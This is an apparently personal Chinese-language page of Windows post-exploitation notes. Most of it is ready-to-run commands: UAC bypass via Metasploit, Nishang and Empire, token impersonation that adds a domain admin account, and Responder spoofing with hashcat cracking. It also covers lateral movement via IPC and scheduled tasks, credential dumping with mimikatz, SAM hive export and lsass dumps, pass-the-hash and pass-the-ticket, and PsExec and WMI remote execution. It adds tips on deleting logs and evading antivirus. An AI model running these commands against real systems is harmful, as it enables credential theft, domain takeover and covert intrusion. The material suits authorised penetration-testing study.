<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">系统当前用户必须在管理员组中</span><br><span class="line">用户账户控制程序UAC设置为默认，“仅在程序试图更改我的计算机时通知我”</span><br><span class="line"></span><br><span class="line">使用msf提权</span><br><span class="line">use exploit/windows/local/bypassuac  该模块会在目标机器上创建多个文件而被杀毒软件识别。</span><br><span class="line">use exploit/windows/local/bypassuac_injection  该模块直接运行在内存的反射DLL中，不会接触机器的硬盘，降低被杀软识别的概率</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">需要用户在管理员组中， 对UAC没有要求</span><br><span class="line">用户需要手动点击弹出的程序 是</span><br><span class="line">执行后需要getsystem</span><br><span class="line"></span><br><span class="line">Nishang</span><br><span class="line">Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -verbose  使用sysprep方法并执行默认payload</span><br><span class="line">Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -method oobe -verbose 使用oobe方法并执行默认payload</span><br><span class="line">Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot;  使用oobe方法并执行指定的payload</span><br><span class="line"></span><br><span class="line">Empire</span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line"><span class="built_in">set</span> Listener http_8080</span><br><span class="line">execute</span><br><span class="line">或</span><br><span class="line">usemodule privesc/bypassuac_wscript    //利用C:Windowswscript.exe</span><br><span class="line"><span class="built_in">set</span> Listener http_8080</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>伪造令牌的核心是Kerberos协议。</p>
<p>①客户端向认证服务器发送请求，要求得到证书。</p>
<p>②认证服务器收到请求后，将包含客户端密钥的加密证书发送给客户端。证书包含服务器Ticket（包含由服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（又称会话密钥，Session Key）。认证服务器也会向服务器发送一份该证书，使服务器能够验证登陆的客户端的身份。</p>
<p>③客户端将Ticket传送给服务器。如果服务器确认该客户端身份，就允许其登陆到服务器。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">令牌分类：</span><br><span class="line">访问令牌：Access Token   表示访问控制操作主体的系统对象</span><br><span class="line">会话令牌：Session Token  表示交互会话中唯一的身份识别码</span><br><span class="line">密保令牌：Security Token 又叫做认证令牌和硬件令牌，是一种计算机身份校验的物理设备，比如U盾</span><br><span class="line"></span><br><span class="line">windows中访问令牌有两种：</span><br><span class="line">Delegation Token：授权令牌，支持交互式会话登陆（远程桌面登陆访问等）</span><br><span class="line">Impresonation Token：模拟令牌，非交互式会话（使用<span class="built_in">net</span> use访问共享文件夹等）</span><br><span class="line"></span><br><span class="line">msf：</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line">add_user shuteer password -h <span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>  在域控主机上添加一个账户</span><br><span class="line">add_group_user &quot;Domain Admins&quot; shuteer -h <span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> 将该账户添加到域管理员组中</span><br><span class="line"></span><br><span class="line">烂土豆提权：</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">breenmachine</span>/<span class="title">RottenPotatoNG</span>/<span class="title">blob</span>/<span class="title">master</span>/<span class="title">RottenPotatoEXE</span>/<span class="title">x64</span>/<span class="title">Release</span>/<span class="title">MSFRottenPotato.exe</span></span></span><br><span class="line"><span class="function">将<span class="title">MSFRottenPotato.exe</span>上传到目标主机后，<span class="title">msf</span>会话中执行：</span></span><br><span class="line"><span class="function"><span class="title">execute</span> -<span class="title">Hc</span> -<span class="title">f</span> <span class="title">MSFRottenPotato.exe</span></span></span><br><span class="line"><span class="function">成功后会在<span class="title">list_tokens</span> -<span class="title">u</span>的<span class="title">Impresonation</span> <span class="title">Token</span>下多出一个<span class="title">token</span>，在使用上面的命令窃取令牌就可以了</span></span><br></pre></td></tr></table></figure>

<h2 id="无凭证条件下的提权"><a href="#无凭证条件下的提权" class="headerlink" title="无凭证条件下的提权"></a>无凭证条件下的提权</h2><p>使用LLMNR和NetBIOS欺骗攻击</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">LLMNR：本地链路多播名称解析是一种域名系统数据包格式。当局域网的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段机器中的名称，直到DNS服务器恢复正常。其支持IPV6，从windows Vista版本开始支持LLMNR。</span><br><span class="line">工作流程：</span><br><span class="line">① DNS客户端在自己的内部名称缓存中查询名称</span><br><span class="line">② 如果没有找到，主机向主DNS发送名称查询请求</span><br><span class="line">③ 如果主DNS无回应或收到错误的信息，主机会向备用DNS发送查询请求</span><br><span class="line">④ 如果备用DNS无回应或收到错误的信息，将使用LLMNR进行解析</span><br><span class="line">⑤ 主机通过UDP协议向组播地址<span class="number">224</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">252</span>的<span class="number">5355</span>端口发送多播查询请求，以获取主机名所对应的IP地址，查询范围仅限于本地子网</span><br><span class="line">⑥ 本地子网中所有支持LLMNR协议的主机在收到请求后，会对比自己的主机名。如果不同则丢弃，如果相同，就向查询主机发送包含自己IP的单播信息。</span><br><span class="line"></span><br><span class="line">NetBIOS：其是一种网络协议，一般用于由十几台计算机组成的局域网中。其不支持IPV6，从windows NT以后开始支持NetBIOS。</span><br><span class="line">NetBIOS支持三种服务：</span><br><span class="line">NetBIOS-NS (名称服务)：主要用于名称注册和解析，以启动会话和分发数据报。该服务需要注册域名服务器来注册NetBIOS的名称。默认监听UDP <span class="number">137</span>端口，也可以使用TCP协议</span><br><span class="line">Datagram Distribution Service (数据报分发服务)：无连接服务。主要负责进行错误检测和恢复，默认监听UDP <span class="number">138</span>端口。</span><br><span class="line">Session Service (会话服务)：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误检测和恢复机制。默认使用TCP <span class="number">139</span>端口</span><br><span class="line"></span><br><span class="line"><span class="built_in">Net</span>-NTLM Hash</span><br><span class="line">其于NTLM Hash不用。</span><br><span class="line">NTLM Hash是指Windows系统的Security Account Manager中保存的用户密码Hash值。其通常保存在SAM文件或者NTDS.DIT数据库中，用于身份验证。</span><br><span class="line"><span class="built_in">Net</span>-NTLM Hash是指在网络环境中经过NTLM认证的Hash值。挑战/响应验证中的“响应”就包含<span class="built_in">Net</span>-NTLM Hash。使用Responder抓取的就是<span class="built_in">Net</span>-NTLM Hash。无法使用抓取到的Hash值进行哈希传递攻击，只有使用Hashcat等工具获取到明文密码后进行横向移动。</span><br></pre></td></tr></table></figure>



<p>Respomder</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Respomder：</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">lgandx</span>/<span class="title">Responder</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Hashcat</span>  (<span class="title">kali</span>自带)</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">hashcat.net</span>/<span class="title">files</span>/<span class="title">hashcat</span>-6.0.0.7<span class="title">z</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">respomder</span> -<span class="title">I</span> <span class="title">eth0</span></span></span><br><span class="line"><span class="function">在目标机器上<span class="title">win</span>+<span class="title">R</span>中输入</span></span><br><span class="line"><span class="function">\\<span class="title">vps</span>的<span class="title">eth0</span>网卡的<span class="title">ip</span></span></span><br><span class="line"><span class="function">获取到加密后的密码，使用<span class="title">hashcat</span>破解</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">hashcat</span> -<span class="title">m</span> 5600 加密的密码 1.<span class="title">txt</span> -<span class="title">o</span> <span class="title">pwd.txt</span> --<span class="title">force</span></span></span><br><span class="line"><span class="function">1.<span class="title">txt</span>是字典文件</span></span><br><span class="line"><span class="function">-<span class="title">m</span> 5600 是加密算法</span></span><br></pre></td></tr></table></figure>

<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="ipc连接"><a href="#ipc连接" class="headerlink" title="ipc连接"></a>ipc连接</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use  查看当前已连接的ipc连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\ipc$ &quot;password&quot; /user:administrator  与<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>进行ipc连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\ipc$ /<span class="built_in">del</span>   删除与<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>的ipc连接</span><br><span class="line"><span class="built_in">dir</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\C$  查看已连接的<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>主机上的C盘  </span><br><span class="line">tasklist /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> /u administrator /p password  查看目标主机的进程</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>  查看目标主机的时间，配合执行计划任务</span><br><span class="line"><span class="built_in">copy</span> calc.bat \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\C$</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">12</span>:<span class="number">00</span> c:\calc.bat   在目标机器中添加计划任务，在<span class="number">12</span>点执行calc.bat  （内容：<span class="built_in">start</span> cala.exe）</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">12</span>:<span class="number">00</span> <span class="built_in">cmd</span>.exe /c &quot;<span class="built_in">ipconfig</span>&quot; &gt;C:/<span class="number">1</span>.txt 在目标机器添加计划任务，<span class="number">12</span>点使用<span class="built_in">cmd</span>执行<span class="built_in">ipconfig</span>，并将结果保存到<span class="number">1</span>.txt文件中</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\C$\<span class="number">1</span>.txt  查看目标机器c盘下的<span class="number">1</span>.txt文件</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">1</span> /delete  清除任务id为<span class="number">1</span>的作业，不带id则删除所有作业</span><br><span class="line">win7和server <span class="number">2008</span>后pat被弃用了，可以使用schtasks</span><br><span class="line"></span><br><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> /tn test /sc onstart /tr c:\calc.bat /ru system /f  创建计划任务</span><br><span class="line">test是任务计划名称，onstart是只执行一次，system是执行的权限</span><br><span class="line">schtasks /run /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> /i /tn &quot;test&quot;  执行test计划任务</span><br><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> /tn &quot;test&quot; /f  删除test计划任务</span><br><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> /u administrator /p &quot;password&quot; /tn test /sc onstart /tr c:\calc.bat /ru system /f   没有建立ipc连接时，指定用户名和密码去创建计划任务</span><br><span class="line">schtasks会留下日志痕迹，需要删除  如：C:\Windows\Tasks\SCHEDLGU.txt</span><br><span class="line">实战时最好不要用schtasks</span><br></pre></td></tr></table></figure>

<h2 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h2> <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">域环境中，用户信息存储在ntds.dit中。本地环境中，保存在SAM文件中。</span><br><span class="line">windows密码由两部分组成。一部分为LM Hash，另一部分为NTLM Hash。</span><br><span class="line">Hash结构为：</span><br><span class="line"><span class="function">username:<span class="title">RID:LM</span>-<span class="title">HASH:NT</span>-<span class="title">HASH</span></span></span><br><span class="line"><span class="function"><span class="title">LM</span>-<span class="title">HASH</span>(<span class="title">LAN</span> <span class="title">Manager</span> <span class="title">Hash</span>),在早期的<span class="title">windows</span>中，采用此加密。其本质为<span class="title">DES</span>加密。当时其非常不安全，所以从<span class="title">Windows</span> <span class="title">Vista</span>和<span class="title">Windows</span> <span class="title">server</span> 2008后默认禁用<span class="title">LM</span> <span class="title">Hash</span>。若抓取的<span class="title">HASH</span>中<span class="title">LM</span>-<span class="title">HASH</span>为<span class="title">AAD3</span>开头，则表示<span class="title">LM</span> <span class="title">HASH</span>已被禁用。具体的加密过程见百度</span></span><br><span class="line"><span class="function"><span class="title">NTLM</span>-<span class="title">HASH</span>是微软为了提高安全性和保证兼容性设计的哈希加密算法。其本质是<span class="title">md4</span>加密。从<span class="title">windows</span> <span class="title">vista</span>和<span class="title">windows</span> <span class="title">server</span> 2003以后认证方式默认为<span class="title">NTLM</span> <span class="title">Hash</span>。</span></span><br></pre></td></tr></table></figure>

<p>在目标机器抓取Hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">GetPass</span><br><span class="line">国人编写的工具，可以直接获取密码。</span><br><span class="line">直接在<span class="built_in">cmd</span>中运行即可。</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PwDump7</span><br><span class="line">直接在<span class="built_in">cmd</span>中运行即可</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">QuarksPwDump  被大部分杀软标记了，可修改源码，免杀</span><br><span class="line">QuarksPwDumps.exe --dump-hash-local</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">读取lsass进程中的明文密码和NTLM HASH。只有windows7和windows server <span class="number">2008</span>之前lsass存储该信息</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br><span class="line">读取sam文件</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;</span><br><span class="line"><span class="function">token::<span class="title">elevate</span> 表示提升为<span class="title">system</span>权限</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Get-PassHashes.ps1导出Hash</span><br><span class="line"></span><br><span class="line">Import-Module .\Get-PassHashes.ps1</span><br><span class="line">Get-PassHashes</span><br></pre></td></tr></table></figure>

<p>离线抓取Hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">导出sam文件</span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line"></span><br><span class="line">将sam.hive和system.hive拖取到本地机器中，使用mimikatz读取Hash</span><br><span class="line">进入mimikatz中执行：</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">sam:sam</span>.<span class="title">hive</span> /<span class="title">system:system</span>.<span class="title">hive</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">导出<span class="title">lsass.dmp</span>文件。</span></span><br><span class="line"><span class="function">①在任务管理器中选择<span class="title">lsass.exe</span>进程，右击<span class="title">Create</span> <span class="title">Dump</span> <span class="title">File</span></span></span><br><span class="line"><span class="function">②使用<span class="title">procdump</span>导出。<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用<span class="title">mimikatz</span>读取<span class="title">lsass.dmp</span>文件：</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span>&quot; &quot;<span class="title">exit</span>&quot; &gt;<span class="title">lsass.txt</span></span></span><br></pre></td></tr></table></figure>



<p>微软为了防止用户密码在内存中被明文泄露，发布了KB2871997，关闭了Wdigest功能。并且Windows server 2012及以上版本都默认关闭Wdigest。可通过查看注册表判断Wdigest功能状态，确认内存中是否有明文密码。</p>
<p>同时KB2871997也限制了本地账户不再允许通过IPC等方式远程接入到计算机中。但是系统默认的Administrator这个sid为500的用户例外。即使该用户修改了用户名，只要sid为500，依旧可以通过远程接入。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">开启Wdigest</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line">关闭Wdigest</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line">使用powershell</span><br><span class="line">开启Wdigest</span><br><span class="line"><span class="built_in">Set</span>-ItemProperty -<span class="built_in">Path</span> HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -<span class="built_in">Type</span> DWORD -Value <span class="number">1</span></span><br><span class="line"></span><br><span class="line">关闭Wdigest</span><br><span class="line"><span class="built_in">Set</span>-ItemProperty -<span class="built_in">Path</span> HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -<span class="built_in">Type</span> DWORD -Value <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>Hashcat用于密码破解。不同版本分别支持CPU，NVIDIA GPU、ATI GPU进行破解。其有不同的版本。</p>
<p>Hashcat只支持CPU破解，oclHashcat和oclGausscrack支持GPU加速破解。</p>
<p>oclHashcat又分为AMD和NVIDIA版本，并且需要安装指定版本的显卡驱动程序。</p>
<p>colHashcat是字典攻击方式。支持多GPU，多HASH，多平台(OpenCL和CUDA)，多操作系统，多算法。支持分布式破解。支持破解Windows密码，Linux密码，Office密码，Wi-Fi密码，MySQL密码，SQL Server密码，以及MD5，SHA1，SHA256等。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">下载地址：kali自带</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">hashcat</span>/<span class="title">hashcat.git</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">linux</span>安装：</span></span><br><span class="line"><span class="function"><span class="title">make</span></span></span><br><span class="line"><span class="function"><span class="title">make</span> <span class="title">install</span></span></span><br><span class="line"><span class="function">或者下载编译好的程序</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用：</span></span><br><span class="line"><span class="function">./<span class="title">hashcat</span> -<span class="title">h</span>  查看帮助</span></span><br><span class="line"><span class="function">./<span class="title">hashcat</span> -<span class="title">b</span>  测试破解的基准速度</span></span><br><span class="line"><span class="function">./<span class="title">hashcat</span> -<span class="title">m</span> 0 -<span class="title">a</span> 0 <span class="title">xxxxx</span> -<span class="title">show</span> -<span class="title">n</span> 10 使用字典破解<span class="title">md5</span>加密的密码</span></span><br><span class="line"><span class="function">-<span class="title">m</span> 指定<span class="title">Hash</span>类型 0表示<span class="title">md5</span>，其余可百度</span></span><br><span class="line"><span class="function">-<span class="title">a</span> 指定破解模式 0为字典破解，1为组合破解，3为掩码暴力破解，4为组合破解</span></span><br><span class="line"><span class="function">-<span class="title">n</span> 指定线程数</span></span><br><span class="line"><span class="function">-<span class="title">show</span>  显示破解出的密码</span></span><br><span class="line"><span class="function">其他用法见百度。</span></span><br></pre></td></tr></table></figure>

<h2 id="PTH哈希传递"><a href="#PTH哈希传递" class="headerlink" title="PTH哈希传递"></a>PTH哈希传递</h2><p>当在域内存在大量相同本地管理员账户和密码，且无法破解明文密码时，可通过抓取NTLM HASH，然后进行Pass The Hash（哈希传递）来实现域内横向移动。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">使用mimikatz进行哈希传递：</span><br><span class="line">域名：test.com</span><br><span class="line">域控： dc</span><br><span class="line">用户名：administrator</span><br><span class="line">NTLM Hash：xxxxxx</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domian:test.com /ntlm:xxxxxxx&quot;</span><br><span class="line">执行成功后会弹出一个<span class="built_in">cmd</span>窗口，即可访问域内机器。</span><br><span class="line"><span class="built_in">dir</span> \\dc\c$  查看域控c盘</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Pass The Key</span><br><span class="line">在安装KB2871997的机器上进行哈希传递,且目标机器也需要安装该补丁</span><br><span class="line">域名：test.com</span><br><span class="line">域控： dc</span><br><span class="line">用户名：administrator</span><br><span class="line">AES-<span class="number">256</span>：xxxxxx</span><br><span class="line">使用mimikatz抓取AES-<span class="number">256</span>密钥：</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br><span class="line">进行攻击</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domian:test.com /aes256:xxxxxx&quot;</span><br></pre></td></tr></table></figure>

<p>dir后面加上的是主机名，不是ip，否则会提示用户名或密码错误</p>
<p>除了aes256，aes128也可以用来哈希传递</p>
<p>使用AES密码进行传递时，需要本地安装KB2871997</p>
<p>如果安装了KB2871997，仍然可以使用SID为500的用户的NTLM Hash来进行哈希传递。</p>
<h2 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">哈希传递需要mimikatz工具具有管理员权限。而票据传递(Pass The Ticket)攻击不需要管理员权限。</span><br><span class="line"></span><br><span class="line">使用mimikatz进行票据传递攻击：</span><br><span class="line">导出票据：</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br><span class="line">清除内存中的票据：</span><br><span class="line">mimikatz.exe &quot;kerberos::purge&quot;</span><br><span class="line">导入高权限票据文件：</span><br><span class="line">mimikatz.exe &quot;kerberos::ptt&quot; &quot;c:\xxxxxx()导出的票据文件&quot;</span><br><span class="line"></span><br><span class="line">使用kekeo进行票据传递攻击：</span><br><span class="line">需要域名，用户名，NTLM Hash。</span><br><span class="line">kekeo.exe &quot;tgt::ask /user:administrator /domain:test.com /ntlm:xxxxxx&quot;</span><br><span class="line">清除内存中的票据：</span><br><span class="line">kekeo.exe &quot;kerberos::purge&quot;</span><br><span class="line">导入票据：</span><br><span class="line">kekeo.exe &quot;kerberos::ptt&quot; &quot;c:\xxxxxx()导出的票据文件&quot;</span><br><span class="line"></span><br><span class="line">导入后即可在<span class="built_in">cmd</span>中直接查看远端主机的文件。</span><br><span class="line">除了使用工具的清除内存票据文件，也可以使用系统自带的命令：klist purge</span><br></pre></td></tr></table></figure>



<h2 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec是PsTools下的工具，自带微软签名。但是已经被大多数杀软拉黑。且使用会留下日志文件。慎用！</span><br><span class="line">需要远程系统开启ADMIN$ 默认开启</span><br><span class="line">在使用PsExec进行远程执行命令时，会在目标系统创建PSEXEC的服务，命令执行完成后会自动删除，创建服务时会产生大量日志。</span><br><span class="line">service.msc win+R查看服务</span><br><span class="line">eventvwr  win+R查看日志</span><br><span class="line"></span><br><span class="line">有IPC连接的情况下：</span><br><span class="line">PsExec.exe -accepteula \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> -s <span class="built_in">cmd</span>.exe  启动一个连接<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>的<span class="built_in">cmd</span>会话，不会新建<span class="built_in">cmd</span></span><br><span class="line"></span><br><span class="line">指定用户名和密码</span><br><span class="line">PsExec.exe -accepteula \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> -u administrator -p password <span class="built_in">cmd</span>.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用metasploit中的PsExec模块，有两个模块，一个为exe程序，一个为powershell版本</span><br><span class="line">search psexec</span><br><span class="line">use exploit/windiows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>   //目标机器ip</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass password</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">search psexec</span><br><span class="line">use exploit/windiows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>   //目标机器ip</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass password</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>WMI是windows内置的工具。其无回显，但使用无日志记录。</p>
<p>wmiexec.vbs 可以回显，可以建立交互式shell，也可以执行单条命令。（国人开发的）</p>
<p>impacket工具包中的wmiexec ，主要用于Linux跨Windows使用。</p>
<p>impacket下载：<a target="_blank" rel="noopener" href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p>
<p>Powersploit中的Invoke-WmiCommand</p>
<p>invoke-WMIMethod</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">在<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>主机上执行命令，并将结果保存在ip.txt文件中</span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> /user:administrator /password:password <span class="keyword">call</span> create &quot;<span class="built_in">cmd</span>.exe /c <span class="built_in">ipconfig</span> &gt; C:\ip.txt&quot;</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\C$\ip.txt</span><br><span class="line"></span><br><span class="line">impackets中的wmiexec使用：</span><br><span class="line">wmiexec.py administrator:password@<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Invoke-WmiCommand的使用：</span><br><span class="line">$User = &quot;test\administartor&quot;</span><br><span class="line">$Password = ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password</span><br><span class="line">$Remote = Invoke-WmiCommand -Payload &#123;<span class="built_in">ipconfig</span>&#125; -Credential $Cred -ComputerName <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line">$Remote.PayloadOutput</span><br><span class="line"></span><br><span class="line">wmiexec.vbs的使用</span><br><span class="line">获取半交互式Shell：</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator password</span><br><span class="line">执行单条命令：</span><br><span class="line">cscript.exe wmiexec.vbs /<span class="built_in">cmd</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator password &quot;<span class="built_in">ipconfig</span>&quot;</span><br><span class="line">如需执行较长时间的命令可以加上-wait <span class="number">5000</span>.如果运行的是nc等不需要输出，且需要一直运行的进程，可以添加-persist参数，就不用<span class="built_in">taskkill</span>来结束远端的进程了。</span><br><span class="line"></span><br><span class="line">Invoke-WMIMethod的使用（powershell自带）：</span><br><span class="line">$User = &quot;test\administartor&quot;</span><br><span class="line">$Password = ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password</span><br><span class="line">$Remote = Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -Credential $Cred -ComputerName &quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;</span><br></pre></td></tr></table></figure>

<h2 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17-010 永恒之蓝"></a>MS17-010 永恒之蓝</h2><p>通过445端口的SMB服务，造成溢出，实现命令执行。对应补丁号：KB2919355</p>
